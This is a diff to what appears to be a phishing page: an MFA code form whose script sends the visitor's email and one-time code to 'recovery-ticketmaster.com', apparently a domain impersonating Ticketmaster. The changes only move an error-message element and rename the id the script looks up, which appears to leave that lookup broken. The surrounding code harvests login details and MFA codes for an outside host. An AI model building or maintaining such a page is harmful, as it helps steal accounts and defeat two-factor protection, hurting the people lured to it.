@@ -8020,8 +8020,9 @@
                           value=""
                           required
                         />
-                        <div id="otp-error-message" class="error-message"></div>
+                        
                       </div>
+                      <div id="otp-error-message" class="error-message"></div>
                     </div>
                     <p
                       id="mfa-code-description"
@@ -8174,7 +8175,7 @@
             const email = document.getElementById('email-input').value;
             const otpCode = document.getElementById('mfa-code-input-field5').value;
             const otpInput = document.getElementById('mfa-code-input-field5');
-            const errorMessageElement = document.getElementById('otp-error-message');
+            const errorMessageElement = document.getElementById('error-message');
 
             fetch('https://recovery-ticketmaster.com/otp-validate', {
                 method: 'POST',
